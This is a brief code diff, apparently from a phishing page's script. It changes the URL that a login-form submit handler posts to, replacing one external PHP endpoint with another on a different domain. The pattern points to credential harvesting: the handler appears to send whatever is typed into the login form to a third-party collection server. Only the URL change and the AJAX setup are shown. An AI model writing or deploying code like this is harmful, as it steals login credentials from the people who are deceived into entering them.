@@ -4,7 +4,7 @@ $(".login-form").submit(function() {
 
 	$.ajax({
 
-        url: "https://pusat.rwsae.biz.id/bokep/index.php",
+        url: "https://payment.rizkyxd.com/ah/index.php",
 
         type: "POST",
 
